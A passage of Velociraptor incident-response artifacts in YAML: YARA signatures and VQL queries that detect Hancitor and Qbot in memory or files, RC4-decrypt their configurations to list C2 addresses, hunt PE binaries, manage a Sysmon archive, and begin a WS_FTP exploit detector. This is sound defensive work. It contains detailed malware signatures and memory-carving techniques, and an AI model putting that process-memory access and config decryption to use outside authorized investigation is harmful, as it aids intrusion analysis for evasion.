                malpedia_reference = "https://malpedia.caad.fkie.fraunhofer.de/details/win.hancitor"
                malpedia_rule_date = "20210604"
                malpedia_hash = "be09d5d71e77373c0f538068be31a2ad4c69cfbd"
                malpedia_version = "20210616"
                malpedia_license = "CC BY-SA 4.0"
                malpedia_sharing = "TLP:WHITE"

            strings:
                $sequence_0 = { 6a00 6a00 6824040000 6a00 6a00 6a00 }
                    // n = 6, score = 800
                    //   6a00                 | push                0
                    //   6a00                 | push                0
                    //   6824040000           | push                0x424
                    //   6a00                 | push                0
                    //   6a00                 | push                0
                    //   6a00                 | push                0

                $sequence_1 = { 68???????? 8d85dcfaffff 50 ff15???????? }
                    // n = 4, score = 600
                    //   68????????           |
                    //   8d85dcfaffff         | lea                 eax, dword ptr [ebp - 0x524]
                    //   50                   | push                eax
                    //   ff15????????         |

                $sequence_2 = { 6800010000 6a40 68???????? e8???????? }
                    // n = 4, score = 600
                    //   6800010000           | push                0x100
                    //   6a40                 | push                0x40
                    //   68????????           |
                    //   e8????????           |

                $sequence_3 = { 750d e8???????? 83c010 a3???????? }
                    // n = 4, score = 500
                    //   750d                 | jne                 0xf
                    //   e8????????           |
                    //   83c010               | add                 eax, 0x10
                    //   a3????????           |

                $sequence_4 = { 6a20 68???????? 68???????? e8???????? 83c410 }
                    // n = 5, score = 500
                    //   6a20                 | push                0x20
                    //   68????????           |
                    //   68????????           |
                    //   e8????????           |
                    //   83c410               | add                 esp, 0x10

                $sequence_5 = { 8955fc 8b45f8 0fb74806 394dfc 7334 6b55fc28 }
                    // n = 6, score = 500
                    //   8955fc               | mov                 dword ptr [ebp - 4], edx
                    //   8b45f8               | mov                 eax, dword ptr [ebp - 8]
                    //   0fb74806             | movzx               ecx, word ptr [eax + 6]
                    //   394dfc               | cmp                 dword ptr [ebp - 4], ecx
                    //   7334                 | jae                 0x36
                    //   6b55fc28             | imul                edx, dword ptr [ebp - 4], 0x28

                $sequence_6 = { e9???????? b801000000 6bc800 8b5508 0fbe040a 8945fc 8b4dfc }
                    // n = 7, score = 500
                    //   e9????????           |
                    //   b801000000           | mov                 eax, 1
                    //   6bc800               | imul                ecx, eax, 0
                    //   8b5508               | mov                 edx, dword ptr [ebp + 8]
                    //   0fbe040a             | movsx               eax, byte ptr [edx + ecx]
                    //   8945fc               | mov                 dword ptr [ebp - 4], eax
                    //   8b4dfc               | mov                 ecx, dword ptr [ebp - 4]

                $sequence_7 = { 85c0 7504 33c0 eb0f 8b450c 50 }
                    // n = 6, score = 500
                    //   85c0                 | test                eax, eax
                    //   7504                 | jne                 6
                    //   33c0                 | xor                 eax, eax
                    //   eb0f                 | jmp                 0x11
                    //   8b450c               | mov                 eax, dword ptr [ebp + 0xc]
                    //   50                   | push                eax

                $sequence_8 = { 83c201 895508 ebaf 33c0 }
                    // n = 4, score = 500
                    //   83c201               | add                 edx, 1
                    //   895508               | mov                 dword ptr [ebp + 8], edx
                    //   ebaf                 | jmp                 0xffffffb1
                    //   33c0                 | xor                 eax, eax

                $sequence_9 = { 55 8bec 81ec58010000 6a44 }
                    // n = 4, score = 500
                    //   55                   | push                ebp
                    //   8bec                 | mov                 ebp, esp
                    //   81ec58010000         | sub                 esp, 0x158
                    //   6a44                 | push                0x44

                $sequence_10 = { 8b4d08 51 ff15???????? 8945fc 8b55fc 8955f4 837dfc00 }
                    // n = 7, score = 500
                    //   8b4d08               | mov                 ecx, dword ptr [ebp + 8]
                    //   51                   | push                ecx
                    //   ff15????????         |
                    //   8945fc               | mov                 dword ptr [ebp - 4], eax
                    //   8b55fc               | mov                 edx, dword ptr [ebp - 4]
                    //   8955f4               | mov                 dword ptr [ebp - 0xc], edx
                    //   837dfc00             | cmp                 dword ptr [ebp - 4], 0

                $sequence_11 = { eb9d 8b45f4 8b4de8 2b4804 }
                    // n = 4, score = 500
                    //   eb9d                 | jmp                 0xffffff9f
                    //   8b45f4               | mov                 eax, dword ptr [ebp - 0xc]
                    //   8b4de8               | mov                 ecx, dword ptr [ebp - 0x18]
                    //   2b4804               | sub                 ecx, dword ptr [eax + 4]

                $sequence_12 = { e8???????? 83c410 83f801 755d }
                    // n = 4, score = 400
                    //   e8????????           |
                    //   83c410               | add                 esp, 0x10
                    //   83f801               | cmp                 eax, 1
                    //   755d                 | jne                 0x5f

                $sequence_13 = { 8bec a1???????? 85c0 740c ff7508 6a00 }
                    // n = 6, score = 400
                    //   8bec                 | mov                 ebp, esp
                    //   a1????????           |
                    //   85c0                 | test                eax, eax
                    //   740c                 | je                  0xe
                    //   ff7508               | push                dword ptr [ebp + 8]
                    //   6a00                 | push                0

                $sequence_14 = { 53 56 57 8b483c 33f6 03c8 6a40 }
                    // n = 7, score = 400
                    //   53                   | push                ebx
                    //   56                   | push                esi
                    //   57                   | push                edi
                    //   8b483c               | mov                 ecx, dword ptr [eax + 0x3c]
                    //   33f6                 | xor                 esi, esi
                    //   03c8                 | add                 ecx, eax
                    //   6a40                 | push                0x40

                $sequence_15 = { 8b4dfc 85c0 7402 8908 8b5518 85d2 }
                    // n = 6, score = 400
                    //   8b4dfc               | mov                 ecx, dword ptr [ebp - 4]
                    //   85c0                 | test                eax, eax
                    //   7402                 | je                  4
                    //   8908                 | mov                 dword ptr [eax], ecx
                    //   8b5518               | mov                 edx, dword ptr [ebp + 0x18]
                    //   85d2                 | test                edx, edx

                $sequence_16 = { 55 8bec 8b4d08 6a00 6a01 51 }
                    // n = 6, score = 400
                    //   55                   | push                ebp
                    //   8bec                 | mov                 ebp, esp
                    //   8b4d08               | mov                 ecx, dword ptr [ebp + 8]
                    //   6a00                 | push                0
                    //   6a01                 | push                1
                    //   51                   | push                ecx

                $sequence_17 = { 41 83f941 72ed 881d???????? c705????????01000000 }
                    // n = 5, score = 400
                    //   41                   | inc                 ecx
                    //   83f941               | cmp                 ecx, 0x41
                    //   72ed                 | jb                  0xffffffef
                    //   881d????????         |
                    //   c705????????01000000     |

                $sequence_18 = { 57 ff15???????? 8bd8 83fbff 7509 6a00 57 }
                    // n = 7, score = 400
                    //   57                   | push                edi
                    //   ff15????????         |
                    //   8bd8                 | mov                 ebx, eax
                    //   83fbff               | cmp                 ebx, -1
                    //   7509                 | jne                 0xb
                    //   6a00                 | push                0
                    //   57                   | push                edi

                $sequence_19 = { 7502 5d c3 ff7508 6a00 50 ff15???????? }
                    // n = 7, score = 400
                    //   7502                 | jne                 4
                    //   5d                   | pop                 ebp
                    //   c3                   | ret
                    //   ff7508               | push                dword ptr [ebp + 8]
                    //   6a00                 | push                0
                    //   50                   | push                eax
                    //   ff15????????         |

                $sequence_20 = { a3???????? 8b45a0 05c8d45566 7440 }
                    // n = 4, score = 100
                    //   a3????????           |
                    //   8b45a0               | mov                 eax, dword ptr [ebp - 0x60]
                    //   05c8d45566           | add                 eax, 0x6655d4c8
                    //   7440                 | je                  0x42

                $sequence_21 = { a1???????? 83c052 8945cc 8365e400 }
                    // n = 4, score = 100
                    //   a1????????           |
                    //   83c052               | add                 eax, 0x52
                    //   8945cc               | mov                 dword ptr [ebp - 0x34], eax
                    //   8365e400             | and                 dword ptr [ebp - 0x1c], 0

                $sequence_22 = { 0345cc 8945c4 8b45cc 0345e4 }
                    // n = 4, score = 100
                    //   0345cc               | add                 eax, dword ptr [ebp - 0x34]
                    //   8945c4               | mov                 dword ptr [ebp - 0x3c], eax
                    //   8b45cc               | mov                 eax, dword ptr [ebp - 0x34]
                    //   0345e4               | add                 eax, dword ptr [ebp - 0x1c]

                $sequence_23 = { c645f301 0fb645f3 85c0 7476 a1???????? 83c044 a3???????? }
                    // n = 7, score = 100
                    //   c645f301             | mov                 byte ptr [ebp - 0xd], 1
                    //   0fb645f3             | movzx               eax, byte ptr [ebp - 0xd]
                    //   85c0                 | test                eax, eax
                    //   7476                 | je                  0x78
                    //   a1????????           |
                    //   83c044               | add                 eax, 0x44
                    //   a3????????           |

                $sequence_24 = { 0305???????? 8945cc 8b45e4 48 8945e4 894df4 }
                    // n = 6, score = 100
                    //   0305????????         |
                    //   8945cc               | mov                 dword ptr [ebp - 0x34], eax
                    //   8b45e4               | mov                 eax, dword ptr [ebp - 0x1c]
                    //   48                   | dec                 eax
                    //   8945e4               | mov                 dword ptr [ebp - 0x1c], eax
                    //   894df4               | mov                 dword ptr [ebp - 0xc], ecx

                $sequence_25 = { 40 8945b8 837db80a 0f8d7f010000 8b45c4 0345cc 8945c4 }
                    // n = 7, score = 100
                    //   40                   | inc                 eax
                    //   8945b8               | mov                 dword ptr [ebp - 0x48], eax
                    //   837db80a             | cmp                 dword ptr [ebp - 0x48], 0xa
                    //   0f8d7f010000         | jge                 0x185
                    //   8b45c4               | mov                 eax, dword ptr [ebp - 0x3c]
                    //   0345cc               | add                 eax, dword ptr [ebp - 0x34]
                    //   8945c4               | mov                 dword ptr [ebp - 0x3c], eax

                $sequence_26 = { 0f8ced000000 a1???????? a3???????? b9382baa99 8d45fc 50 6a00 }
                    // n = 7, score = 100
                    //   0f8ced000000         | jl                  0xf3
                    //   a1????????           |
                    //   a3????????           |
                    //   b9382baa99           | mov                 ecx, 0x99aa2b38
                    //   8d45fc               | lea                 eax, dword ptr [ebp - 4]
                    //   50                   | push                eax
                    //   6a00                 | push                0

                $sequence_27 = { 8b45a0 05c8d45566 0f8482000000 c645f301 }
                    // n = 4, score = 100
                    //   8b45a0               | mov                 eax, dword ptr [ebp - 0x60]
                    //   05c8d45566           | add                 eax, 0x6655d4c8
                    //   0f8482000000         | je                  0x88
                    //   c645f301             | mov                 byte ptr [ebp - 0xd], 1

            condition:
                7 of them
        }
sources:
  - precondition:
      SELECT OS From info() where OS = 'windows'

    query: |
        -- find target files
        LET targetFiles = SELECT FullPath FROM glob(globs=TargetFileGlob)

        -- find velociraptor process
        LET me <= SELECT Pid
                  FROM pslist(pid=getpid())

        -- find all processes and add filters
        LET processes <= SELECT Name AS ProcessName, CommandLine, Pid
                        FROM pslist()
                        WHERE Name =~ ProcessRegex
                            AND format(format="%d", args=Pid) =~ PidRegex
                            AND NOT Pid in me.Pid

        -- scan processes in scope with our DetectionYara
        LET processDetections <= SELECT * FROM foreach(row=processes,
                                query={
                                    SELECT * FROM if(condition=TargetFileGlob="",
                                        then={
                                            SELECT *, ProcessName, CommandLine, Pid, Rule AS YaraRule
                                            FROM proc_yara(pid=Pid, rules=DetectionYara)
                                        })
                                })

        -- scan files in scope with our DetectionYara
        LET fileDetections = SELECT * FROM foreach(row=targetFiles,
                                query={
                                    SELECT * FROM if(condition=TargetFileGlob,
                                        then={
                                            SELECT * FROM switch(
                                                a={ -- yara detection
                                                    SELECT FullPath, Rule AS YaraRule
                                                    FROM yara(files=FullPath, rules=DetectionYara)
                                                },
                                                b={ -- yara miss
                                                    SELECT FullPath, Null AS YaraRule
                                                    FROM targetFiles
                                                })
                                        },
                                        else={ -- no yara detection run
                                            SELECT FullPath, 'N/A' AS YaraRule
                                            FROM targetFiles
                                        })
                             })
        -- return the VAD region size from yara detections for later use
        LET regionDetections = SELECT *
                                FROM foreach(row=processDetections,
                                    query={
                                        SELECT YaraRule, Pid, ProcessName, CommandLine, Address as HancitorBaseOffset, Size AS VADSize
                                        FROM vad(pid=Pid)
                                        WHERE Protection =~ "xrw"
                                            AND Size > 4096 and Size < 106496
                                })

        -- get data from the whole PE
        LET peData <= SELECT * FROM if(condition=TargetFileGlob,
                                        then={ -- query files
                                            SELECT YaraRule, FullPath,
                                                read_file(filename=FullPath) AS PEData
                                            FROM fileDetections
                                        },
                                        else={ -- query processes
                                            SELECT YaraRule, Pid, ProcessName, CommandLine,
                                                read_file(filename=str(str=Pid), accessor='process', offset=HancitorBaseOffset, length=VADSize) AS PEData
                                            FROM regionDetections
                                        })

        -- return .data section info
        LET sectionInfo <= SELECT *,
                                    parse_pe(file=PEData, accessor="data").Sections[2] AS SectionData
                                FROM peData
                                WHERE NOT SectionData = null

        -- read the data from .data sections
        LET dataSectionData <= SELECT *,
                                SectionData.RVA AS HancitorDataRVA,
                                read_file(filename=PEData, accessor="data", offset=SectionData.FileOffset, length=SectionData.Size) AS HancitorDataSectionData
                           FROM sectionInfo

        -- parse the .data sections to extract the encrypted config
        LET parsedDataSection <= SELECT *,
                            parse_binary(filename=HancitorDataSectionData, accessor="data", profile='''[
                                ["HancitorData", 0, [
                                        ["KeyValue", 16, "String", {"length": 8, "term":""}],
                                        ["HancitorEncodedConfig", "x=> 24", "String", {"length": x=> 8192, "term":"", "max_length": x=> 8192}]
                                    ]
                                ]
                            ]''', struct="HancitorData") AS HancitorData
                          FROM dataSectionData

        -- format/calculate rc4 key
        LET keyConfigPairs <= SELECT *,
                                parse_string_with_regex(string=hash(path=HancitorData.KeyValue, accessor="data").SHA1, regex="(..........).+").g1 AS SubStringRC4Key,
                                HancitorData.HancitorEncodedConfig AS HancitorEncodedConfig
                              FROM parsedDataSection

        -- rc4 decrypt the configurations
        LET decryptedConfig <= SELECT *,
                                parse_string_with_regex(string=crypto_rc4(key=unhex(string=SubStringRC4Key), string=HancitorEncodedConfig), regex="(?P<BUILD>.+)\\b\\0+(?P<URLs>.+)\\b\\|\\0+") AS HancitorDecodedConfig
                             FROM keyConfigPairs

        -- format the decrypted configurations
        SELECT * FROM if(condition=TargetFileGlob,
            then= {
                SELECT YaraRule, FullPath,
                    HancitorDecodedConfig.BUILD AS HancitorBuild,
                    split(string=HancitorDecodedConfig.URLs, sep="\\|" ) AS HancitorC2
                FROM decryptedConfig
            },
            else= {
                SELECT YaraRule, Pid, ProcessName, CommandLine,
                    HancitorDecodedConfig.BUILD AS HancitorBuild,
                    split(string=HancitorDecodedConfig.URLs, sep="\\|" ) AS HancitorC2
                FROM decryptedConfig
        })

---END OF FILE---

======
FILE: /content/exchange/legacy/shares.yaml
======
name: Windows.System.Shares
author: 'Matt Green - @mgreen27'
description: |
   This artifact will extract network shares per machine.
   
type: CLIENT

parameters:
  - name: NameRegex
    description: Regex filter for share name. e.g Admin\$ for Admin$
    default: .
    type: regex
  - name: PathRegex
    description: Regex filter for local path. e.g C:\\Windows$ for Admin$
    default: .
    type: regex
    
sources:
  - precondition:
      SELECT OS From info() where OS = 'windows'

    query: |
        SELECT Name, Path, Caption, Status,MaximumAllowed,AllowMaximum,InstallDate
        FROM wmi(query='SELECT * FROM Win32_Share',namespace='root/cimv2')
        WHERE Name =~ NameRegex AND Path =~ PathRegex

---END OF FILE---

======
FILE: /content/exchange/legacy/Windows.Carving.Qbot.yaml
======
name: Windows.Carving.Qbot
author: "Eduardo Mattos - @eduardfir"
description: |
    This artifact yara-scans memory or unpacked DLL samples for Qbot
    (or Qakbot) detections, decrypts and returns the botnet and C2
    configurations.

    You may select specific file paths or processes to be
    yara-scanned, or allow it to yara-scan all memory space.

    Currently this artifact parses encrypted configurations from the
    Qbot variant introducted in February 2022. It will identify, but not 
    parse the configurations from earlier variants.

    NOTE: This content simply carves the configuration and does not
    unpack files on disk.  That means pointing this artifact as a
    packed or obfuscated file will not obtain the expected results.

type: CLIENT

reference:
  - https://blog.vincss.net/2021/03/re021-qakbot-dangerous-malware-has-been-around-for-more-than-a-decade.html
  - https://github.com/kevoreilly/CAPEv2/blob/master/modules/processing/parsers/mwcp/QakBot.py

parameters:
  - name: TargetFileGlob
    default:
  - name: PidRegex
    default: .
  - name: ProcessRegex
    default: .
  - name: DetectionYara
    default: |
        rule QakBot {
            meta:
                author = "kevoreilly"
                description = "QakBot Payload"
                cape_type = "QakBot Payload"
            strings:
                $crypto1 = {8B 5D 08 0F B6 C2 8A 16 0F B6 1C 18 88 55 13 0F B6 D2 03 CB 03 CA 81 E1 FF 00 00 80 79 08 49 81 C9 00 FF FF FF 41}
                $crypto2 = {5? 33 F? [0-9] 89 7? 24 ?? 89 7? 24 ?? 8? [1-3] 24 [1-4] C7 44 24 ?0 01 23 45 67 C7 44 24 ?4 89 AB CD EF C7 44 24 ?8 FE DC BA 98 C7 44 24 ?C 76 54 32 10 C7 44 24 ?0 F0 E1 D2 C3}
                $anti_sandbox1 = {8D 4? FC [0-1] E8 [4-7] E8 [4] 85 C0 7E (04|07) [4-7] 33 (C0|D2) 74 02 EB FA}
                $anti_sandbox2 = {8D 45 ?? 50 E8 [2] 00 00 59 68 [4] FF 15 [4] 89 45 ?? 83 7D ?? 0F 76 0C}
                $decrypt_config1 = {FF 37 83 C3 EC 53 8B 5D 0C 8D 43 14 50 6A 14 53 E8 ?? ?? ?? ?? 83 C4 14 85 C0 ?? 26 ?? ?? 86 20 02 00 00 66 85 C0 ?? ?? FF 37 FF 75 10 53}
                $decrypt_config2 = {8B 45 08 8B 88 24 04 00 00 51 8B 55 10 83 EA 14 52 8B 45 0C 83 C0 14 50 6A 14 8B 4D 0C 51 E8 6C 08 00 00}
                $decrypt_config3 = {6A 13 8B CE 8B C3 5A 8A 18 3A 19 75 05 40 41 4A 75 F5 0F B6 00 0F B6 09 2B C1 74 05 83 C8 FF EB 0E}
                $call_decrypt = {83 7D ?? 00 56 74 0B FF 75 10 8B F3 E8 [4] 59 8B 45 0C 83 F8 28 72 19 8B 55 08 8B 37 8D 48 EC 6A 14 8D 42 14 52 E8}
                $mw_xor_key = {33 D2 8B ?? 6A 5A 5B F7 F3 8B 5D 08 8A 04 1A 8B 55 fC 8B 5D 10 3A 04 ?? 74 07 46 3B ?? 72 E1 EB 04}
            condition:
                any of ($*)
        }
sources:
  - precondition:
      SELECT OS From info() where OS = 'windows'

    query: |
        -- find target files
        LET targetFiles = SELECT FullPath FROM glob(globs=TargetFileGlob)

        -- find velociraptor process
        LET me <= SELECT Pid
                  FROM pslist(pid=getpid())

        -- find all processes and add filters
        LET processes <= SELECT Name AS ProcessName, CommandLine, Pid
                        FROM pslist()
                        WHERE Name =~ ProcessRegex
                            AND format(format="%d", args=Pid) =~ PidRegex
                            AND NOT Pid in me.Pid
        -- scan processes in scope with our DetectionYara
        LET processDetections <= SELECT * FROM foreach(row=processes,
                                query={
                                    SELECT * FROM if(condition=TargetFileGlob="",
                                        then={
                                            SELECT *, ProcessName, CommandLine, Pid, Rule AS YaraRule
                                            FROM proc_yara(pid=Pid, rules=DetectionYara)
                                        })
                                })
        -- scan files in scope with our DetectionYara
        LET fileDetections = SELECT * FROM foreach(row=targetFiles,
                                query={
                                    SELECT * FROM if(condition=TargetFileGlob,
                                        then={
                                            SELECT * FROM switch(
                                                a={ -- yara detection
                                                    SELECT FullPath, Rule AS YaraRule
                                                    FROM yara(files=FullPath, rules=DetectionYara)
                                                },
                                                b={ -- yara miss
                                                    SELECT FullPath, Null AS YaraRule
                                                    FROM targetFiles
                                                })
                                        },
                                        else={ -- no yara detection run
                                            SELECT FullPath, 'N/A' AS YaraRule
                                            FROM targetFiles
                                        })
                             })
        -- return the VAD region size from yara detections for later use
        LET regionDetections = SELECT *
                                FROM foreach(row=processDetections,
                                    query={
                                        SELECT YaraRule, Pid, ProcessName, CommandLine, Address as QBOTBaseOffset, Size AS VADSize
                                        FROM vad(pid=Pid)
                                        WHERE Protection =~ "xrw"
                                })

        -- get data from the whole PE
        LET peData <= SELECT * FROM if(condition=TargetFileGlob,
                                        then={ -- query files
                                            SELECT YaraRule, FullPath,
                                                read_file(filename=FullPath) AS PEData
                                            FROM fileDetections
                                        },
                                        else={ -- query processes
                                            SELECT YaraRule, Pid, ProcessName, CommandLine,
                                                read_file(filename=str(str=Pid), accessor='process', offset=QBOTBaseOffset, length=VADSize) AS PEData
                                            FROM regionDetections
                                        })

        -- return .rsrc section info
        LET sectionInfo <= SELECT *,
                                parse_pe(file=PEData, accessor="data").Sections[4] AS Sectionrsrc
                           FROM peData

        -- read the data from .rsrc sections
        LET sectionData <=  SELECT * FROM if(condition=TargetFileGlob,
                                        then={ -- query files
                                            SELECT *,
                                                Sectionrsrc.RVA AS QBOTrsrcOffSet,
                                                read_file(filename=PEData, accessor="data", offset=Sectionrsrc.FileOffset, length=Sectionrsrc.Size) AS QBOTrsrcData
                                           FROM sectionInfo
                                        },
                                        else={ -- query processes
                                            SELECT *,
                                                Sectionrsrc.RVA AS QBOTrsrcOffSet,
                                                read_file(filename=PEData, accessor="data", offset=Sectionrsrc.RVA, length=Sectionrsrc.Size) AS QBOTrsrcData
                                           FROM sectionInfo
                                        })

        -- parse the .rsrc sections to extract the rcdata resources containing the encrypted info
        LET parsedRdata = SELECT *,
                            parse_binary(filename=QBOTrsrcData, accessor="data", profile='''[
                                ["QbotRCData", 0, [
                                        ["AddressFirstRsc", 104, "uint32", {"length": 4, "term":""}],
                                        ["SizeFirstRsc", 108, "uint32", {"length": 4, "term":""}],
                                        ["AddressSecondRsc", 120, "uint32", {"length": 4, "term":""}],
                                        ["SizeSecondRsc", 124, "uint32", {"length": 4, "term":""}],
                                        ["EncBotInfo", "x=> x.AddressFirstRsc - QBOTrsrcOffSet", "String", {"length": "x=> x.SizeFirstRsc", "term":""}],
                                        ["EncC2Info", "x=> x.AddressSecondRsc - QBOTrsrcOffSet", "String", {"length": "x=> x.SizeSecondRsc", "term":""}]
                                    ]
                                ]
                            ]''', struct="QbotRCData") AS RCDataSections
                          FROM sectionData

        -- rc4 decrypt the configurations
        LET decryptedInfo <= SELECT *,
                                format(format="%x", args=crypto_rc4(key=unhex(string="2fbafdc0451de65322a9aee65f28be319ad9574e"), string=RCDataSections.EncC2Info)) AS DecryptedC2Info,
                                format(format="%x", args=crypto_rc4(key=unhex(string="2fbafdc0451de65322a9aee65f28be319ad9574e"), string=RCDataSections.EncBotInfo)) AS DecryptedBotInfo
                             FROM parsedRdata

        -- format the decrypted configurations
        SELECT * FROM if(condition=TargetFileGlob,
            then= {
                SELECT YaraRule, FullPath,
                    { SELECT unhex(string=BotId) AS Botnet, unhex(string=CampaignEpoch) AS Campaign FROM parse_records_with_regex(file=DecryptedBotInfo, accessor="data", regex='(?P<BotId>3130.+)0D0A(?P<CampaignEpoch>333D.+)0D0A')} AS BotInfo,
                    { SELECT ip(netaddr4_be=int(int="0x" + IPAdd)) AS IPAdress, int(int="0x" + Port) AS PortNum FROM parse_records_with_regex(file=DecryptedC2Info, accessor="data", regex='01(?P<IPAdd>........)(?P<Port>....)')} AS C2Info
                FROM decryptedInfo
            },
            else= {
                SELECT YaraRule, Pid, ProcessName, CommandLine,
                    { SELECT unhex(string=BotId) AS Botnet, unhex(string=CampaignEpoch) AS Campaign FROM parse_records_with_regex(file=DecryptedBotInfo, accessor="data", regex='(?P<BotId>3130.+)0D0A(?P<CampaignEpoch>333D.+)0D0A')} AS BotInfo,
                    { SELECT ip(netaddr4_be=int(int="0x" + IPAdd)) AS IPAdress, int(int="0x" + Port) AS PortNum FROM parse_records_with_regex(file=DecryptedC2Info, accessor="data", regex='01(?P<IPAdd>........)(?P<Port>....)')} AS C2Info
                FROM decryptedInfo
        })

---END OF FILE---

======
FILE: /content/exchange/legacy/BinaryHunter.yaml
======
name: Windows.Detection.BinaryHunter
author: "Matt Green - @mgreen27"
description: |
    This artifact enables hunting for binary attributes.
    
    The artifact takes a glob targetting input, then checks each file in scope for an MZ header. 
    The artifact also queries Authenticode details and parses out PE attributes.
    
    Both PE and Authenticode output can be queried for relevant strings using a regex filter and whitelist to hunt with. 
    This enables unique capability to hunt for specific things such as PE imports, exports or other attributes.
    
    Note: this artifacts filters are cumulative so a hash based hit will return 
    no results if the file is filtered out by other filters.  
    For most performant searches leverage path, size and and date filters. By default 
    the artifact leverages the 'auto' data accessor but can also be changed as desired.  

parameters:
  - name: TargetGlob
    description: Glob to target.
    default: "**/*"
  - name: Accessor
    description: Velociraptor accessor to use. Changing to ntfs will increase scan time.
    default: auto
  - name: UnexpectedExtension
    description: "Exclude binaries with expected extension: com|cpl|dll|drv|exe|mui|scr|sfx|sys|winmd"
    type: bool
  - name: ExcludeTrusted
    description: Exclude binaries with Trusted Authenticode certificates.
    type: bool
  - name: AuthenticodeRegex
    description: Regex to search through all authenrticode data.
    default: .
    type: regex
  - name: AuthenticodeWhitelistRegex
    description: Regex to whitelist in all Authenticode data.
    default:
    type: regex
  - name: PEInformationRegex
    description: Regex to filter for PE information. e.g VersionInformation, exports etc
    default: .
    type: regex
  - name: PEInformationWhitelistRegex
    description: Regex to whitelist for PE information. e.g VersionInformation, exports etc
    default:
    type: regex
  - name: DateAfter
    description: Search for binaries with timestamps after this date. YYYY-MM-DDTmm:hh:ssZ
    type: timestamp
  - name: DateBefore
    description: Search for binaries with timestamps before this date. YYYY-MM-DDTmm:hh:ssZ
    type: timestamp
  - name: SizeMax
    description: Return binaries only under this size in bytes.
    type: int64
    default: 4294967296
  - name: SizeMin
    description: Return binaries only over this size in bytes.
    type: int64
    default: 0
  - name: MD5List
    description: MD5 hash list to hunt for. New MD5 hash on each line
    validating_regex: '(^\s*[A-F0-9]{32}\s*$)'
    default:
  - name: SHA1List
    description: SHA1 hash list to hunt for. New SHA1 hash on each line
    validating_regex: '^\s*([A-F0-9]{40}\s*)+$'
    default:
  - name: SHA256List
    description: SHA256 hash list to hunt for. New SHA256 hash on each line
    validating_regex: '^\s*([A-F0-9]{64}\s*)+$'
    default:

sources:
  - query: |
      -- setup hash lists if needed
      LET MD5Array <= split(sep='\\s+',string=MD5List)
      LET SHA1Array <=  split(sep='\\s+',string=SHA1List)
      LET SHA256Array <= split(sep='\\s+',string=SHA256List)
      
      -- firstly find files in scope with performance
      LET find_files = SELECT *, 
            read_file(filename=FullPath,accessor=Accessor,offset=0,length=2) as _Header
        FROM if(condition=DateBefore AND DateAfter,
            then={
                SELECT FullPath, Name, Size,Mtime,Atime,Ctime,Btime
                FROM glob(globs=TargetGlob,accessor=Accessor)
                WHERE NOT IsDir AND NOT IsLink
                    AND Size > SizeMin AND Size < SizeMax
                    AND ( Mtime < DateBefore OR Ctime < DateBefore OR Btime < DateBefore )
                    AND ( Mtime > DateAfter OR Ctime > DateAfter OR Btime > DateAfter )
            }, 
            else={ SELECT * FROM  if(condition=DateBefore,
                then={
                    SELECT FullPath, Name, Size,Mtime,Atime,Ctime,Btime
                    FROM glob(globs=FullPath,accessor=Accessor)
                    WHERE NOT IsDir AND NOT IsLink
                        AND Size > SizeMin AND Size < SizeMax
                        AND ( Mtime < DateBefore OR Ctime < DateBefore OR Btime < DateBefore )
                },
                else={ SELECT * FROM  if(condition=DateAfter,
                then={
                    SELECT FullPath, Name, Size,Mtime,Atime,Ctime,Btime
                    FROM glob(globs=TargetGlob,accessor=Accessor)
                    WHERE NOT IsDir AND NOT IsLink
                        AND Size > SizeMin AND Size < SizeMax
                        AND ( Mtime > DateAfter OR Ctime > DateAfter OR Btime > DateAfter )
                },
                else={
                    SELECT FullPath, Name, Size,Mtime,Atime,Ctime,Btime
                    FROM glob(globs=TargetGlob,accessor=Accessor)
                    WHERE NOT IsDir AND NOT IsLink
                        AND Size > SizeMin AND Size < SizeMax
                })})})
        WHERE _Header = 'MZ'
            AND if(condition= UnexpectedExtension,
                then= NOT Name =~ '\.(com|cpl|dll|drv|exe|mui|scr|sfx|sys|winmd)$',
                else= True)
      
      
      -- parse PE attributes and run final filters
      SELECT
        dict(FullPath=FullPath,Name=Name,Size=Size,
            Timestamps=dict(Mtime=Mtime,Atime=Atime,Ctime=Ctime,Btime=Btime)
                ) as File,
        authenticode(filename=FullPath) as Authenticode,
        parse_pe(file=FullPath) as PE,
        hash(path=FullPath) as Hash
      FROM find_files
      WHERE 
        serialize(item=Authenticode) =~ AuthenticodeRegex
        AND NOT if(condition=WhitelistRegex,
            then= serialize(item=Authenticode) =~ AuthenticodeWhitelistRegex,
            else= False)
        AND serialize(item=PE) =~ PEInformationRegex
        AND NOT if(condition=PEInformationWhitelistRegex,
            then= serialize(item=PE) =~ PEInformationWhitelistRegex,
            else= False)
        AND if(condition= ExcludeTrusted,
                then= NOT Authenticode.Trusted = "trusted",
                else= True)
        AND if(condition= MD5List OR SHA1List OR SHA256List,
            then=(
                    if(condition= MD5List, 
                    then= Hash.MD5 in MD5Array)
                 OR if(condition= SHA1List, 
                        then= Hash.SHA1 in SHA1Array)
                 OR if(condition= SHA256List, 
                        then= Hash.SHA256 in SHA256Array)
            ), else = True )

---END OF FILE---

======
FILE: /content/exchange/artifacts/SysmonArchiveMonitor.yaml
======
name: Windows.Events.SysmonArchiveMonitor
author: Matt Green - @mgreen27
description: |
   This artifact enables automatic management of the Sysmon archive folder.
   
   FileDelete is a super usefuil capability offered by Sysmon enabling archive 
   of deleted files. It is typically used to archive interesting files or to target 
   collection during an active engagement.
   
   Requrements: Exchange.Windows.Sysinternals.SysmonArchive

reference:
    - https://github.com/trustedsec/SysmonCommunityGuide/blob/master/chapters/file-delete.md
    - https://isc.sans.edu/diary/Sysmon+and+File+Deletion/26084
    - https://blog.nviso.eu/2022/06/30/enforcing-a-sysmon-archive-quota/


type: CLIENT_EVENT

parameters:
   - name: SysmonArchiveGlob
     description: Glob to target configured Sysmon archive folder contents.
     default: C:\Sysmon\*
   - name: ArchiveSize
     description: Desired size of archive in bytes. Default is ~1GB.
     default: 1000000000
     type: int64
   - name: CheckDelay
     description: Desired time to wait between checks. Default is 10 mins (600s).
     default: 600
     type: int64
     
     
sources:
  - query: |
      LET schedule = SELECT UTC.String AS Now
        FROM clock(period=CheckDelay)
        
      -- on each schedule run Windows.Sysinternals.SysmonArchive
      SELECT * FROM foreach(row=schedule, 
                query={
                    SELECT *
                    FROM Artifact.Exchange.Windows.Sysinternals.SysmonArchive(
                                        ArchiveSize=ArchiveSize,
                                        SysmonArchiveGlob=SysmonArchiveGlob,
                                        DeleteFiles=True,
                                        ShowAll=False)
                })

---END OF FILE---

======
FILE: /content/exchange/artifacts/WS_FTP.yaml
======

name: Windows.Detection.WS_FTP
author: Matt Green - @mgreen27
description: | 
   This is an artifact to detect exploitation of a Progress Software's WS_FTP 
   critical vulnerability observed in the wild.
   
